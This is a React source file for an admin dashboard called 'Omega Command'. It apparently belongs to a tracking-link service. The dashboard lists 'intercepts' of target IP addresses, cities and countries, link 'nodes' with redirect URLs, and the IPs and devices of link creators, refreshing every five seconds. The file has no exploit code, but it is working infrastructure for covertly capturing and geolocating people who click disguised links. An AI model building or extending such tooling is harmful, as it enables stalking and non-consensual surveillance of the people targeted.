import React, { useState, useEffect } from 'react';
import { ShieldAlert, Terminal, Eye, Globe, Database, Server, LogOut, Search, Activity, Camera, MapPin, Cpu, Trash2, User, ExternalLink, Info, AlertCircle, Trash } from 'lucide-react';
import { CaptureReport, LinkConfig, OwnerInfo } from '../types';
import ReportDetail from './ReportDetail';

const AdminPanel: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [creds, setCreds] = useState({ user: '', pass: '' });
  const [globalData, setGlobalData] = useState<{ reports: CaptureReport[], links: LinkConfig[], owners: Record<string, OwnerInfo>, stats: any } | null>(null);
  const [loading, setLoading] = useState(false);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [search, setSearch] = useState('');
  const [tab, setTab] = useState<'reports' | 'links' | 'owners'>('reports');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const res = await fetch('/api/admin/global-intel', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: creds.user, password: creds.pass })
    });
    if (res.ok) {
      setGlobalData(await res.json());
      setIsAuthenticated(true);
    } else alert("ACCESS DENIED: Credentials Invalid.");
    setLoading(false);
  };

  const refreshData = async () => {
    if (!isAuthenticated) return;
    const res = await fetch('/api/admin/global-intel', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: creds.user, password: creds.pass })
    });
    if (res.ok) setGlobalData(await res.json());
  };

  const deleteReport = async (e: React.MouseEvent, id: string) => {
    e.stopPropagation();
    if (!confirm('Purge this record from global database?')) return;
    await fetch('/api/admin/delete-report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...creds, reportId: id })
    });
    refreshData();
  };

  const deleteLink = async (id: string) => {
    if (!confirm('Erase this Node and all associated capture data?')) return;
    await fetch('/api/admin/delete-link', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...creds, linkId: id })
    });
    refreshData();
  };

  useEffect(() => {
    if (isAuthenticated) {
      const i = setInterval(refreshData, 5000);
      return () => clearInterval(i);
    }
  }, [isAuthenticated]);

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-paper flex items-center justify-center p-6 font-sans">
        <div className="w-full max-w-md bg-white border-3 border-ink rounded-[2.5rem] p-10 shadow-comic animate-pop">
          <div className="flex flex-col items-center mb-10">
            <div className="w-20 h-20 bg-brand-accent/10 rounded-[2rem] flex items-center justify-center border-3 border-ink mb-6 rotate-3">
              <ShieldAlert className="text-brand-accent" size={40} />
            </div>
            <h1 className="text-3xl font-black text-ink italic uppercase tracking-tighter">Omega Command</h1>
            <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">Restricted Access Portal</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <label className="text-[10px] font-black text-ink/40 uppercase tracking-widest ml-1">Codename</label>
              <input type="text" placeholder="ADMIN_USER" value={creds.user} onChange={e => setCreds({...creds, user: e.target.value})} className="w-full bg-paper border-3 border-ink rounded-2xl px-5 py-4 text-ink font-bold outline-none focus:bg-white transition-colors uppercase" />
            </div>
            <div className="space-y-2">
              <label className="text-[10px] font-black text-ink/40 uppercase tracking-widest ml-1">Access Key</label>
              <input type="password" placeholder="••••••••" value={creds.pass} onChange={e => setCreds({...creds, pass: e.target.value})} className="w-full bg-paper border-3 border-ink rounded-2xl px-5 py-4 text-ink font-bold outline-none focus:bg-white transition-colors" />
            </div>
            <button className="w-full bg-brand-accent text-white font-black py-5 rounded-3xl border-3 border-ink shadow-comic hover:translate-y-1 hover:shadow-comic-sm transition-all uppercase italic tracking-tighter">
              {loading ? 'Validating...' : 'Authenticate Console'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const listReports = globalData?.reports.filter(r => 
    r.location?.ip?.includes(search) || 
    r.ownerId.toLowerCase().includes(search.toLowerCase()) || 
    r.linkId?.toLowerCase().includes(search.toLowerCase())
  ) || [];

  const listLinks = globalData?.links.filter(l => 
    l.name.toLowerCase().includes(search.toLowerCase()) || 
    l.id.includes(search) ||
    l.ownerId.includes(search)
  ) || [];

  const listOwners = Object.values(globalData?.owners || {}).filter(o => 
    o.ownerId.toLowerCase().includes(search.toLowerCase()) || 
    o.ip?.includes(search)
  );

  return (
    <div className="min-h-screen bg-paper text-ink font-sans p-4 md:p-8 animate-pop">
      <div className="max-w-7xl mx-auto space-y-8">
        
        {/* Header Console */}
        <div className="comic-card p-8 bg-white border-brand-accent/20 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="flex items-center gap-6">
            <div className="bg-brand-accent p-4 border-3 border-ink -rotate-3 shadow-comic-sm">
              <Terminal className="text-white" size={28} />
            </div>
            <div>
              <h1 className="text-3xl font-black text-ink uppercase italic tracking-tighter">System Overseer</h1>
              <div className="flex items-center gap-2 mt-1">
                <div className="w-2 h-2 rounded-full bg-brand-sage animate-pulse" />
                <span className="text-[10px] font-black text-ink/30 uppercase tracking-[0.3em]">Telemetry Relay: Active</span>
              </div>
            </div>
          </div>
          
          <div className="flex flex-wrap items-center gap-3">
            <nav className="flex bg-paper border-3 border-ink p-1 rounded-2xl">
              {(['reports', 'links', 'owners'] as const).map((t) => (
                <button 
                  key={t}
                  onClick={() => setTab(t)}
                  className={`px-6 py-2 rounded-xl text-xs font-black uppercase italic transition-all ${tab === t ? 'bg-brand-accent text-white shadow-lg' : 'text-ink/40 hover:text-ink'}`}
                >
                  {t}
                </button>
              ))}
            </nav>
            <button onClick={() => window.location.hash = '#/'} className="comic-button bg-white px-6 py-3 font-black text-xs uppercase italic flex items-center gap-2">
              <LogOut size={16} /> Exit Panel
            </button>
          </div>
        </div>

        {/* Global Vital Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-8">
          {[
            { label: 'Total Intercepts', val: globalData?.stats.totalReports, icon: Eye, color: 'text-brand-accent', bg: 'bg-brand-accent/5' },
            { label: 'Active Nodes', val: globalData?.stats.totalLinks, icon: Server, color: 'text-brand-sage', bg: 'bg-brand-sage/5' },
            { label: 'Owner Entities', val: globalData?.stats.totalOwners, icon: User, color: 'text-brand-light', bg: 'bg-slate-50' },
            { label: 'Unique Targets', val: globalData?.stats.uniqueTargetIps, icon: Globe, color: 'text-brand-crimson', bg: 'bg-brand-crimson/5' }
          ].map((s, i) => (
            <div key={i} className="comic-card bg-white p-6 text-center group">
              <div className={`${s.bg} w-12 h-12 rounded-2xl flex items-center justify-center mx-auto mb-4 border-2 border-ink shadow-comic-sm group-hover:-translate-y-1 transition-transform`}>
                <s.icon className={s.color} size={20} />
              </div>
              <span className="text-3xl font-black text-ink block tracking-tighter italic">{s.val}</span>
              <span className="text-[10px] font-black uppercase text-ink/30 tracking-[0.2em]">{s.label}</span>
            </div>
          ))}
        </div>

        {/* Intelligence Repository */}
        <div className="comic-card bg-white min-h-[600px] flex flex-col overflow-hidden">
          <div className="p-8 border-b-3 border-ink bg-paper flex flex-col md:flex-row md:items-center justify-between gap-4">
            <h2 className="text-xl font-black text-ink uppercase italic tracking-tighter flex items-center gap-3">
              <Database className="text-brand-accent" /> 
              {tab === 'reports' ? 'Global Intercepts' : tab === 'links' ? 'Active Network Nodes' : 'Owner Intelligence'}
            </h2>
            <div className="relative">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-ink/30" size={18} />
              <input 
                type="text" 
                placeholder="Query database..." 
                className="bg-white border-3 border-ink rounded-2xl pl-12 pr-6 py-3 text-sm font-bold text-ink outline-none focus:bg-brand-accent/5 w-full md:w-80 uppercase italic transition-colors"
                value={search}
                onChange={e => setSearch(e.target.value)}
              />
            </div>
          </div>

          <div className="flex-1 overflow-x-auto custom-scrollbar">
            {tab === 'reports' && (
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b-3 border-ink text-[11px] font-black text-ink/30 uppercase tracking-[0.2em] bg-paper">
                    <th className="px-8 py-4">Timestamp</th>
                    <th className="px-8 py-4">Signal Source (IP)</th>
                    <th className="px-8 py-4">Node Origin</th>
                    <th className="px-8 py-4">Geo-Data</th>
                    <th className="px-8 py-4 text-right">Protocol</th>
                  </tr>
                </thead>
                <tbody className="divide-y-2 divide-paper">
                  {listReports.map((r, i) => (
                    <tr key={i} className="group hover:bg-brand-accent/5 cursor-pointer transition-colors" onClick={() => setSelectedReport(r)}>
                      <td className="px-8 py-6">
                        <div className="flex flex-col">
                          <span className="text-ink font-black text-sm italic">{new Date(r.timestamp).toLocaleDateString()}</span>
                          <span className="text-[10px] font-bold text-ink/40">{new Date(r.timestamp).toLocaleTimeString()}</span>
                        </div>
                      </td>
                      <td className="px-8 py-6 font-mono text-sm text-brand-accent font-bold">{r.location?.ip}</td>
                      <td className="px-8 py-6">
                        <div className="flex flex-col">
                          <span className="text-ink font-black text-xs italic uppercase">{r.linkId}</span>
                          <span className="text-[10px] font-bold text-ink/30">{r.ownerId}</span>
                        </div>
                      </td>
                      <td className="px-8 py-6">
                        <div className="flex items-center gap-2 text-xs font-black text-ink/60 uppercase italic">
                          <MapPin size={14} className="text-brand-sage" /> {r.location?.city || 'Unassigned'}, {r.location?.country || 'UNK'}
                        </div>
                      </td>
                      <td className="px-8 py-6 text-right">
                        <button onClick={(e) => deleteReport(e, r.id)} className="p-3 bg-paper border-2 border-ink rounded-xl text-ink/30 hover:bg-brand-crimson hover:text-white transition-all shadow-comic-sm">
                          <Trash size={16} />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}

            {tab === 'links' && (
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b-3 border-ink text-[11px] font-black text-ink/30 uppercase bg-paper">
                    <th className="px-8 py-4">Alias</th>
                    <th className="px-8 py-4">Node Hash</th>
                    <th className="px-8 py-4">Creator ID</th>
                    <th className="px-8 py-4">Redirect</th>
                    <th className="px-8 py-4 text-right">Erase</th>
                  </tr>
                </thead>
                <tbody>
                  {listLinks.map((l, i) => (
                    <tr key={i} className="border-b-2 border-paper hover:bg-paper transition-all">
                      <td className="px-8 py-6 text-ink font-black italic">{l.name}</td>
                      <td className="px-8 py-6 font-mono text-xs text-brand-accent font-bold">{l.id}</td>
                      <td className="px-8 py-6 text-ink/60 font-black text-xs uppercase">{l.ownerId}</td>
                      <td className="px-8 py-6 text-[10px] text-ink/40 truncate max-w-[200px] font-bold italic">{l.redirectUrl}</td>
                      <td className="px-8 py-6 text-right">
                        <button onClick={() => deleteLink(l.id)} className="p-3 border-2 border-ink text-brand-crimson hover:bg-brand-crimson hover:text-white transition-all rounded-xl shadow-comic-sm">
                          <Trash2 size={16} />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}

            {tab === 'owners' && (
              <div className="p-8 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 bg-paper/50">
                {listOwners.map((o, i) => (
                  <div key={i} className="bg-white border-3 border-ink p-8 rounded-[2rem] shadow-comic-sm hover:-translate-y-1 transition-all relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-6 opacity-5 group-hover:scale-110 transition-transform"><User size={64}/></div>
                    <div className="flex items-center justify-between mb-6">
                       <h3 className="text-ink font-black uppercase italic tracking-tighter text-lg">{o.ownerId}</h3>
                       <div className="px-3 py-1 bg-brand-sage/10 border-2 border-ink rounded-lg text-[9px] font-black uppercase text-brand-sage">Authorized</div>
                    </div>
                    <div className="space-y-4 text-[10px] font-black uppercase tracking-widest text-ink/40">
                       <div className="flex justify-between border-b-2 border-paper pb-2"><span>CREATOR IP</span> <span className="text-brand-accent font-mono">{o.ip}</span></div>
                       <div className="flex justify-between border-b-2 border-paper pb-2"><span>ENV</span> <span className="text-ink/80">{o.device?.os} / {o.device?.browser}</span></div>
                       <div className="flex justify-between"><span>LAST SYNC</span> <span className="text-ink/80">{new Date(o.lastActive).toLocaleTimeString()}</span></div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
      {selectedReport && <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
};

export default AdminPanel;